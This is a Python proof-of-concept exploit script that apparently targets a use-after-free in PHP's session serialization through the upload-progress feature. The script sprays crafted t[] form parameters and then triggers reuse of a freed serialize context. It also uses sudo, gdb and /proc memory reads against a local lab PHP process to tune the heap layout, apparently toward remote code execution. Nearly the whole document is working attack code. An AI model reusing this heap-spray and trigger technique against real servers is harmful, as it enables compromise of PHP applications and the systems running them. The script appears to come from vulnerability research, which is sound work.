#!/usr/bin/env python3
"""seg1.py - spray t[] then trigger one progress update, so the dangling
serialize context is reused while the spray is already allocated.

The progress callback flushes the session on every *file* part, so a file part
at the end of the body fires the reuse immediately - before the END decode and
before anything else can consume the freed 64-byte block.

Usage: python3 seg1.py --t 400
"""
import argparse
import os
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
BND = b"UctxPoc2026"
LAB = "/tmp/php2shell_ap"
SESS = LAB + "/sess"
ERR = LAB + "/error.log"
AREAS = [0x7FFFF6B70CD8, 0x7FFFF6B70CE0, 0x7FFFF6B70CE8]  # serdata, unserlvl, userdata+8
SERDATA, UNSERLVL = 0x7FFFF6B70CC8, 0x7FFFF6B70CE0
SERFLAG = 0x7FFFF6B70CD0


def rd(pid, addr, n):
    r = subprocess.run(
        ["sudo", "dd", "if=/proc/%d/mem" % pid, "bs=1", "skip=%d" % addr,
         "count=%d" % n, "iflag=skip_bytes,count_bytes"],
        capture_output=True)
    return r.stdout if len(r.stdout) == n else None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--t", type=int, default=400)
    ap.add_argument("--files", type=int, default=1)
    ap.add_argument("--poke", type=int, default=0)
    a = ap.parse_args()

    out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
    child = int(out.split("child=")[1].split()[0])
    sid = "sg%d-abcdef" % a.t

    P.send(URL, P.arm_body(sid, BND, 20, 65536), BND, sid, 0, 0)
    time.sleep(1.5)

    # release the stale descriptor so the request does not block in flock
    fds = subprocess.run(["sudo", "ls", "-l", "/proc/%d/fd" % child], capture_output=True, text=True).stdout
    stale = re.findall(r" (\d+) -> .*sess_" + re.escape(sid), fds)
    if stale:
        subprocess.run(["sudo", "gdb", "-q", "-p", str(child), "-batch",
                        "-ex", "call (int)close(%s)" % stale[0], "-ex", "detach"], capture_output=True)

    post = (rd(child, SERDATA, 8), rd(child, SERFLAG, 4), rd(child, UNSERLVL, 4))
    print("after arm: serdata=%s serflag=%s unserlvl=%s" % (
        hex(struct.unpack("<Q", post[0])[0]) if post[0] else "-",
        struct.unpack("<i", post[1])[0] if post[1] else "-",
        struct.unpack("<i", post[2])[0] if post[2] else "-"))

    if a.poke and post[0]:
        addr = struct.unpack("<Q", post[0])[0]
        pat = (struct.pack("<QII", P.MARKER, 8, 0) + b"\x00" * 8) * 2 + b"\x00" * 16
        cmds = ["-ex", "set {char[64]}%d = {%s}" % (addr, ",".join(str(b) for b in pat))]
        subprocess.run(["sudo", "gdb", "-q", "-p", str(child), "-batch"] + cmds + ["-ex", "detach"],
                       capture_output=True)
        print("poked %#x" % addr)

    body = bytearray()
    body += P.mp_part(BND, b"PHPSESSID", sid.encode())
    small = struct.pack("<QII", P.MARKER, 8, 0) + b"\x00" * 8
    for _ in range(a.t):
        body += P.mp_part(BND, b"t[]", small)
    body += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(a.files):
        body += P.mp_part(BND, b"f", b"A" * 6144, filename=b"f" + str(len(body)).encode())
    body += b"--" + BND + b"--\r\n"

    before = len(open(ERR, errors="replace").read())
    g = subprocess.Popen(["sudo", "gdb", "-q", "-p", str(child), "-batch", "-x", "/tmp/crash.gdb"],
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    time.sleep(1.5)
    st, d, _ = P.send(URL, bytes(body), BND, sid, 0, 0)
    time.sleep(1.5)
    g.terminate()
    try:
        gout = g.communicate(timeout=10)[0].decode("utf8", "replace")
    except subprocess.TimeoutExpired:
        g.kill()
        gout = g.communicate()[0].decode("utf8", "replace")
    crash = [l for l in gout.splitlines() if l.startswith(("CRASH", "#0", "#1", "#2", "#3", "#4"))]
    log = open(ERR, errors="replace").read()[before:]
    allocful = re.findall(r"tried to allocate (\d+)", log)
    txt = d.decode("utf8", "replace")
    heads = re.findall(r"^t\[(\d+)\] len=(\d+) head=([0-9a-f]+)", txt, re.M)
    exp = (struct.pack("<QII", P.MARKER, 8, 0) + b"\x00" * 40).hex()
    dev = [i for i, _ln, h in heads if h[:len(exp)] != exp]
    ser = rd(child, SERDATA, 8)
    lvl = rd(child, UNSERLVL, 4)
    flag = rd(child, SERFLAG, 4)
    print("t=%d files=%d resp=%s alloc=%s deviating_t=%d alive=%s serdata=%s unserlvl=%s serflag=%s" % (
        a.t, a.files, st, allocful[:1], len(dev), os.path.exists("/proc/%d" % child),
        hex(struct.unpack("<Q", ser)[0]) if ser else "-",
        struct.unpack("<i", lvl)[0] if lvl else "-",
        struct.unpack("<i", flag)[0] if flag else "-"))
    if dev:
        for i in dev[:4]:
            hit = [h for j, _l, h in heads if j == i][0]
            print("  t[%s] head=%s" % (i, hit))
    for line in crash[:6]:
        print("  " + line)


if __name__ == "__main__":
    main()
